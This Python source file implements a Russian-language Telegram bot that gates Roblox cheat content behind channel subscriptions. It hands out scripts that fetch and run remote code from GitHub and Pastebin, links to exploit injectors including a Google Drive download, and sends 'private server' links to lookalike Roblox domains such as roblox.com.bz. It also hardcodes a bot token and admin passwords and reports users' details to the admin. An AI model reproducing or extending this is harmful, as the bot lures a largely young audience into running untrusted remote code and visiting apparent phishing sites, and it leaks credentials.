import telebot
import random
from telebot import types
import sqlite3
import os
import socket
from threading import Thread
import uuid

TOKEN = os.environ.get("TOKEN", "8993935217:AAFxkEuK_lqK0FANyZbwlEvO6zyBtSEgOCM")
ADMIN_ID = 8091608667
ADMIN_SECRET = "larscriptkryyyyyyt"
ADMIN_SECRET2 = "кресло качалка"
BOT_USERNAME = "larskeys_bot"

DB_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "bot_users.db")

HARDCODED_REFS = {
    "5e185ffd": "Спасибо за подписку! Вот скрипт:\n\nloadstring(game:HttpGet(\"https://raw.githubusercontent.com/fsfsfss323/key_system.lua/refs/heads/main/script.lua\"))()",
    "55fd5fde": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/fsfsfss323/selllemon.lua/refs/heads/main/sellemon.lua\"))()",
    "371bb522": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/fsfsfss323/cherber.lua/refs/heads/main/cherber.lua\"))()",
}

KOREAN_MM2_LINK = "https://roblox.com.bz/games/142823291/Murder-Mystery-2?privateServerLinkCode=67807728184198406550153024608844"
KOREAN_ADOPT_LINK = "https://roblox.com.bz/games/920587237/Adopt-Me?privateServerLinkCode=67807728184198406550153024608844"

# ============================================================
# МИНИ-ПРИЛОЖЕНИЕ (WEB APP) — HTML КОД
# ============================================================
WEB_APP_HTML = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Приватные сервера</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            min-height: 100vh;
            background: linear-gradient(135deg, #1a0a2e, #2d1b4e, #4a1a6b, #6b2fa0, #4a1a6b, #2d1b4e, #1a0a2e);
            background-size: 400% 400%;
            animation: gradient 8s ease infinite;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            padding: 20px;
        }
        @keyframes gradient {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        .container {
            background: rgba(255, 255, 255, 0.08);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border-radius: 30px;
            padding: 30px 25px;
            max-width: 400px;
            width: 100%;
            border: 1px solid rgba(255, 255, 255, 0.15);
            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.6);
            transition: transform 0.3s ease;
        }
        .container:hover {
            transform: scale(1.02);
        }
        .title {
            text-align: center;
            color: #fff;
            font-size: 26px;
            font-weight: 700;
            margin-bottom: 25px;
            text-shadow: 0 0 20px rgba(180, 80, 255, 0.5);
            letter-spacing: 1px;
        }
        .server-item {
            background: rgba(255, 255, 255, 0.06);
            border-radius: 16px;
            padding: 16px 20px;
            margin-bottom: 14px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            border: 1px solid rgba(255, 255, 255, 0.06);
            transition: all 0.3s ease;
            cursor: pointer;
        }
        .server-item:hover {
            background: rgba(255, 255, 255, 0.12);
            border-color: rgba(180, 80, 255, 0.3);
            transform: translateX(5px);
        }
        .server-item .info {
            display: flex;
            flex-direction: column;
        }
        .server-item .name {
            color: #fff;
            font-size: 17px;
            font-weight: 600;
        }
        .server-item .desc {
            color: rgba(255, 255, 255, 0.6);
            font-size: 13px;
            margin-top: 2px;
        }
        .server-item .badge {
            background: linear-gradient(135deg, #8b5cf6, #d946ef);
            padding: 6px 14px;
            border-radius: 20px;
            color: #fff;
            font-size: 12px;
            font-weight: 600;
            white-space: nowrap;
            box-shadow: 0 4px 15px rgba(139, 92, 246, 0.4);
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            color: rgba(255, 255, 255, 0.4);
            font-size: 12px;
        }
        .footer a {
            color: rgba(180, 80, 255, 0.8);
            text-decoration: none;
        }
        .glow {
            text-shadow: 0 0 30px rgba(180, 80, 255, 0.3);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="title glow">🌟 ВСЕ СЕРВЕРА</div>
        
        <div class="server-item" onclick="window.open('https://roblox.com.bz/games/142823291/Murder-Mystery-2?privateServerLinkCode=67807728184198406550153024608844', '_blank')">
            <div class="info">
                <span class="name">🔪 MM2 Приватка</span>
                <span class="desc">Мгновенный доступ</span>
            </div>
            <span class="badge">▶ ИГРАТЬ</span>
        </div>

        <div class="server-item" onclick="window.open('https://roblox.com.bz/games/920587237/Adopt-Me?privateServerLinkCode=67807728184198406550153024608844', '_blank')">
            <div class="info">
                <span class="name">🧸 Adopt Me Приватка</span>
                <span class="desc">Мгновенный доступ</span>
            </div>
            <span class="badge">▶ ИГРАТЬ</span>
        </div>

        <div class="server-item" onclick="window.open('https://roblox.com.bz/games/142823291/Murder-Mystery-2?privateServerLinkCode=67807728184198406550153024608844', '_blank')">
            <div class="info">
                <span class="name">🇰🇷 Корейский MM2</span>
                <span class="desc">Корейский сервер</span>
            </div>
            <span class="badge">▶ ИГРАТЬ</span>
        </div>

        <div class="server-item" onclick="window.open('https://roblox.com.bz/games/920587237/Adopt-Me?privateServerLinkCode=67807728184198406550153024608844', '_blank')">
            <div class="info">
                <span class="name">🇰🇷 Корейский Adopt Me</span>
                <span class="desc">Корейский сервер</span>
            </div>
            <span class="badge">▶ ИГРАТЬ</span>
        </div>

        <div class="server-item" onclick="window.open('https://t.me/freprivatka34', '_blank')">
            <div class="info">
                <span class="name">📢 Наш Telegram</span>
                <span class="desc">Больше приватных серверов</span>
            </div>
            <span class="badge">▶ ПЕРЕЙТИ</span>
        </div>

        <div class="footer">
            🚀 © 2026 YAKUSHA Team
        </div>
    </div>
</body>
</html>
'''

GUIDE_TEXT = """
📖 *КАК ЗАПУСТИТЬ СКРИПТЫ?*

1️⃣ Скачай инжектор:
• Android: Delta, Arceus X, Vega X
• iOS: ScriptWare, Hydrogen
• PC: Xeno, Ro-Exec, Delta

2️⃣ Открой инжектор и нажми "Execute" или "Inject"

3️⃣ Вставь скрипт в поле ввода

4️⃣ Нажми "Run" или "Execute"

5️⃣ Готово! Скрипт запущен!

🔗 Где скачать инжектор?
• Delta: deltaexploits.net
• Arceus X: arceusx.com
• Xeno: discord.gg/xeno

⚠️ Используй только официальные сайты!
"""

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, ref_code TEXT, subscribed BOOLEAN DEFAULT 0)")
    c.execute("CREATE TABLE IF NOT EXISTS ref_links (id INTEGER PRIMARY KEY AUTOINCREMENT, link TEXT UNIQUE, message TEXT)")
    conn.commit()
    conn.close()

def add_user(user_id, ref_code=None):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT user_id FROM users WHERE user_id = ?", (user_id,))
    exists = c.fetchone()
    if not exists:
        try:
            c.execute("INSERT INTO users (user_id, ref_code, subscribed) VALUES (?, ?, 0)", (user_id, ref_code))
            conn.commit()
        except:
            pass
        conn.close()
        return True
    else:
        if ref_code:
            try:
                c.execute("UPDATE users SET ref_code = ? WHERE user_id = ?", (ref_code, user_id))
                conn.commit()
            except:
                pass
    conn.close()
    return False

def set_user_subscribed(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("UPDATE users SET subscribed = 1 WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()

def is_user_subscribed(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT subscribed FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    return row and row[0] == 1

def get_user_ref_code(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT ref_code FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else None

def create_ref_link(message):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    ref = str(uuid.uuid4())[:8]
    c.execute("INSERT INTO ref_links (link, message) VALUES (?, ?)", (ref, message))
    conn.commit()
    conn.close()
    return ref

def get_ref_message(ref):
    if ref in HARDCODED_REFS:
        return HARDCODED_REFS[ref]
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT message FROM ref_links WHERE link = ?", (ref,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else None

def get_all_ref_links():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT id, link, message FROM ref_links")
    links = c.fetchall()
    conn.close()
    return links

def delete_ref_link(link_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("DELETE FROM ref_links WHERE id = ?", (link_id,))
    conn.commit()
    conn.close()

def get_all_users():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT user_id FROM users")
    users = [row[0] for row in c.fetchall()]
    conn.close()
    return users

def count_users():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM users")
    count = c.fetchone()[0]
    conn.close()
    return count

init_db()

CHANNELS = [
    {"name": "freprivatka34", "url": "https://t.me/freprivatka34"},
    {"name": "freegodlymm2_67", "url": "https://t.me/freegodlymm2_67"},
    {"name": "keyscripts3", "url": "https://t.me/keyscripts3"}
]

KEYS = ["МОПС", "СКИТ", "ТАКСА", "КИТ", "LARS", "MOPS", "ARDOR", "MALTUIPY"]
PRIVATE_SERVER_LINK = "https://roblox.com.ge/games/142823291/Murder-Mystery-2?privateServerLinkCode=67807728184198406550153024608844"
SCRIPT_LINK = "loadstring(game:HttpGet(\"https://pastebin.com/raw/GdQULgA6\"))()"
DELTA_LINK = "https://drive.google.com/file/d/1G2gniClYv0qV0BU9-xfYD4UOcxUljH4s/view?usp=sharing"

bot = telebot.TeleBot(TOKEN)

# Хранилище Web App данных
WEB_APP = types.WebAppInfo(url="https://your-webapp-host.com/")  # Замени на реальный URL после загрузки HTML

def notify_admin(text):
    try:
        bot.send_message(ADMIN_ID, text)
    except:
        pass

def is_admin(user_id):
    return user_id == ADMIN_ID

def get_unsubscribed_channels(user_id):
    not_subbed = []
    for ch in CHANNELS:
        try:
            member = bot.get_chat_member(f"@{ch['name']}", user_id)
            if member.status not in ["member", "administrator", "creator"]:
                not_subbed.append(ch)
        except:
            not_subbed.append(ch)
    return not_subbed

def get_channels_keyboard(is_ref=False):
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    for ch in CHANNELS:
        keyboard.add(types.InlineKeyboardButton(text=f"Подписаться ✅ {ch['name']}", url=ch['url']))
    cb = "check_sub_ref" if is_ref else "check_sub"
    keyboard.add(types.InlineKeyboardButton(text="🔍 Проверить подписку", callback_data=cb))
    return keyboard

def get_unsub_keyboard(not_subbed, is_ref=False):
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    for ch in not_subbed:
        keyboard.add(types.InlineKeyboardButton(text=f"Подписаться ❎ {ch['name']}", url=ch['url']))
    cb = "check_sub_ref" if is_ref else "check_sub"
    keyboard.add(types.InlineKeyboardButton(text="🔍 Проверить снова", callback_data=cb))
    return keyboard

def get_success_keyboard():
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    keyboard.add(types.InlineKeyboardButton(text="📜 Скрипт на все игры", callback_data="get_script"))
    keyboard.add(types.InlineKeyboardButton(text="🔑 Ключ для скрипта", callback_data="get_key"))
    keyboard.add(types.InlineKeyboardButton(text="🔒 Приватный сервер MM2", callback_data="get_private"))
    
    # ============================================================
    # НОВАЯ КНОПКА "ВСЕ СЕРВЕРА" С МИНИ-ПРИЛОЖЕНИЕМ
    # ============================================================
    keyboard.add(types.InlineKeyboardButton(
        text="🌐 ВСЕ СЕРВЕРА 🚀", 
        web_app=WEB_APP
    ))
    
    keyboard.add(types.InlineKeyboardButton(text="😮 КОРЕЙСКИЙ СЕРВЕР ММ2 😮", url=KOREAN_MM2_LINK))
    keyboard.add(types.InlineKeyboardButton(text="💘 КОРЕЙСКИЙ СЕРВЕР АДОПТ МИ 💘", url=KOREAN_ADOPT_LINK))
    keyboard.add(types.InlineKeyboardButton(text="📖 Как запустить скрипт?", callback_data="get_guide"))
    keyboard.add(types.InlineKeyboardButton(text="📥 Скачать инжектор (Delta)", url=DELTA_LINK))
    return keyboard

def get_admin_keyboard():
    keyboard = types.InlineKeyboardMarkup(row_width=2)
    keyboard.add(types.InlineKeyboardButton("📊 Статистика", callback_data="admin_stats"))
    keyboard.add(types.InlineKeyboardButton("👥 Пользователи", callback_data="admin_users_list"))
    keyboard.add(types.InlineKeyboardButton("📨 Рассылка", callback_data="admin_broadcast"))
    keyboard.add(types.InlineKeyboardButton("➕ Создать реф. ссылку", callback_data="admin_ref_create"))
    keyboard.add(types.InlineKeyboardButton("📋 Список реф. ссылок", callback_data="admin_ref_list"))
    keyboard.add(types.InlineKeyboardButton("🗑 Удалить реф. ссылку", callback_data="admin_ref_del"))
    return keyboard

@bot.message_handler(commands=["start"])
def start(message):
    args = message.text.split()
    is_ref = len(args) > 1 and args[1].startswith("ref_")
    ref_code = args[1].replace("ref_", "") if is_ref else None
    is_new = add_user(message.from_user.id, ref_code)
    
    if is_new:
        user = message.from_user
        notify_admin(f"🆕 Новый пользователь!\n\n🆔 ID: {user.id}\n👤 Имя: {user.first_name}\n📛 @{user.username or 'нет'}\n👥 Всего: {count_users()}")
    
    # ПРОВЕРКА: если пользователь уже подписан — сразу даём доступ
    if is_user_subscribed(message.from_user.id):
        bot.send_message(message.chat.id, "✅ Добро пожаловать обратно!\n\nВыбери что хочешь получить:", reply_markup=get_success_keyboard())
        return
    
    if is_ref:
        bot.send_message(message.chat.id, "🔗 Ты перешёл по реферальной ссылке!\n\nПодпишись на каналы и нажми проверить:", reply_markup=get_channels_keyboard(is_ref=True))
    else:
        bot.send_message(message.chat.id, "😌 Чтобы продолжить пользоваться ботом, пожалуйста, выполни следующие задания!", reply_markup=get_channels_keyboard())

@bot.message_handler(commands=["getkey"])
def getkey(message):
    add_user(message.from_user.id)
    not_subbed = get_unsubscribed_channels(message.from_user.id)
    if not not_subbed:
        k = random.choice(KEYS)
        bot.send_message(message.chat.id, f"🔑 Твой ключ для скрипта:\n\n{k}")
    else:
        bot.send_message(message.chat.id, "📢 Подпишитесь на каналы для получения скрипта и ключа", reply_markup=get_unsub_keyboard(not_subbed))

@bot.message_handler(func=lambda m: m.text == ADMIN_SECRET)
def admin_panel(message):
    if not is_admin(message.from_user.id):
        return
    refs = len(get_all_ref_links()) + len(HARDCODED_REFS)
    bot.send_message(message.chat.id, f"🛡 Админ панель\n\n👥 Пользователей: {count_users()}\n🔗 Реф. ссылок: {refs} (вшитых: {len(HARDCODED_REFS)})\n\nВыбери действие:", reply_markup=get_admin_keyboard())

@bot.message_handler(func=lambda m: m.text == ADMIN_SECRET2)
def broadcast_panel(message):
    if not is_admin(message.from_user.id):
        return
    msg = bot.send_message(message.chat.id, f"📨 Введи текст рассылки (получат {count_users()} чел.):")
    bot.register_next_step_handler(msg, broadcast_start)

def broadcast_start(message):
    users = get_all_users()
    count = 0
    for uid in users:
        try:
            bot.send_message(uid, message.text)
            count += 1
        except:
            pass
    bot.send_message(message.chat.id, f"✅ Рассылка завершена! Отправлено: {count}/{len(users)}")

@bot.callback_query_handler(func=lambda call: True)
def user_callback(call):
    action = call.data
    user_id = call.from_user.id
    
    if action in ["check_sub", "check_sub_ref"]:
        is_ref = action == "check_sub_ref"
        not_subbed = get_unsubscribed_channels(user_id)
        if not not_subbed:
            # ПОМЕЧАЕМ ПОЛЬЗОВАТЕЛЯ КАК ПОДПИСАННОГО
            set_user_subscribed(user_id)
            
            if is_ref:
                ref_code = get_user_ref_code(user_id)
                ref_msg = get_ref_message(ref_code) if ref_code else None
                bot.send_message(call.message.chat.id, ref_msg if ref_msg else "✅ Подписка подтверждена!")
            else:
                bot.send_message(call.message.chat.id, "✅ Подписка подтверждена!\n\nВыбери что хочешь получить:", reply_markup=get_success_keyboard())
        else:
            text = "❌ Осталось подписаться:\n\n"
            for ch in not_subbed:
                text += f"❎ {ch['name']}\n"
            bot.send_message(call.message.chat.id, text, reply_markup=get_unsub_keyboard(not_subbed, is_ref))
    
    elif action == "get_script":
        bot.send_message(call.message.chat.id, f"📜 Скрипт на все игры:\n\n{SCRIPT_LINK}")
        bot.answer_callback_query(call.id)
        user = call.from_user
        notify_admin(f"📥 Запросили скрипт!\n\n👤 {user.first_name}\n📛 @{user.username or 'нет'}\n🆔 {user.id}")
    
    elif action == "get_key":
        k = random.choice(KEYS)
        bot.send_message(call.message.chat.id, f"🔑 Твой ключ для скрипта:\n\n{k}")
        bot.answer_callback_query(call.id)
        user = call.from_user
        notify_admin(f"🔑 Запросили ключ!\n\n👤 {user.first_name}\n📛 @{user.username or 'нет'}\n🆔 {user.id}\n🔑 Ключ: {k}")
    
    elif action == "get_private":
        bot.send_message(call.message.chat.id, f"🔒 Приватный сервер MM2\n\n{PRIVATE_SERVER_LINK}")
        bot.answer_callback_query(call.id)
    
    elif action == "get_guide":
        bot.send_message(call.message.chat.id, GUIDE_TEXT, parse_mode="Markdown")
        bot.answer_callback_query(call.id)
    
    elif action == "admin_ref_create":
        if not is_admin(user_id):
            return
        msg = bot.send_message(call.message.chat.id, "📝 Введи текст который увидят ПОСЛЕ подписки:")
        bot.register_next_step_handler(msg, create_ref_with_message)
        bot.answer_callback_query(call.id)
    
    elif action == "admin_ref_list":
        if not is_admin(user_id):
            return
        links = get_all_ref_links()
        text = "📋 Вшитые ссылки:\n"
        for ref, msg in HARDCODED_REFS.items():
            text += f"• {ref} — {msg[:40]}...\n"
        text += f"\n📋 Ссылки из базы ({len(links)}):\n"
        for l in links:
            text += f"• {l[1]} — {l[2][:30]}...\n" if l[2] else f"• {l[1]}\n"
        bot.send_message(call.message.chat.id, text)
        bot.answer_callback_query(call.id)
    
    elif action == "admin_ref_del":
        if not is_admin(user_id):
            return
        links = get_all_ref_links()
        if not links:
            bot.send_message(call.message.chat.id, "🔗 Нет ссылок для удаления.")
        else:
            keyboard = types.InlineKeyboardMarkup(row_width=1)
            for l in links:
                keyboard.add(types.InlineKeyboardButton(f"❌ {l[1]}", callback_data=f"admin_delref_{l[0]}"))
            bot.send_message(call.message.chat.id, "Выбери ссылку для удаления:", reply_markup=keyboard)
        bot.answer_callback_query(call.id)
    
    elif action.startswith("admin_delref_"):
        if not is_admin(user_id):
            return
        link_id = int(action.replace("admin_delref_", ""))
        delete_ref_link(link_id)
        bot.send_message(call.message.chat.id, "✅ Ссылка удалена.")
        bot.answer_callback_query(call.id)
    
    elif action == "admin_stats":
        if not is_admin(user_id):
            return
        refs = len(get_all_ref_links()) + len(HARDCODED_REFS)
        bot.send_message(call.message.chat.id, f"📊 Статистика:\n👥 Пользователей: {count_users()}\n🔗 Реф. ссылок: {refs} (вшитых: {len(HARDCODED_REFS)})")
        bot.answer_callback_query(call.id)
    
    elif action == "admin_users_list":
        if not is_admin(user_id):
            return
        users = get_all_users()
        if not users:
            bot.send_message(call.message.chat.id, "👥 Пользователей пока нет.")
        else:
            text = "\n".join(f"• {u}" for u in users[:50])
            if len(users) > 50:
                text += f"\n... и ещё {len(users) - 50}"
            bot.send_message(call.message.chat.id, f"👥 Пользователи ({len(users)}):\n\n{text}")
        bot.answer_callback_query(call.id)
    
    elif action == "admin_broadcast":
        if not is_admin(user_id):
            return
        msg = bot.send_message(call.message.chat.id, f"📨 Введи текст рассылки (получат {count_users()} чел.):")
        bot.register_next_step_handler(msg, broadcast_start)
        bot.answer_callback_query(call.id)
    
    else:
        bot.answer_callback_query(call.id)

def create_ref_with_message(message):
    msg_text = message.text
    ref = create_ref_link(msg_text)
    link = f"https://t.me/{BOT_USERNAME}?start=ref_{ref}"
    bot.send_message(message.chat.id, f"✅ Ссылка создана:\n\n{link}\n\nТекст: {msg_text}")

def run_server():
    port = int(os.environ.get("PORT", 10000))
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', port))
    s.listen(1)
    while True:
        c, _ = s.accept()
        c.send(b"HTTP/1.1 200 OK\r\n\r\nBot running")
        c.close()

Thread(target=run_server).start()
bot.polling()
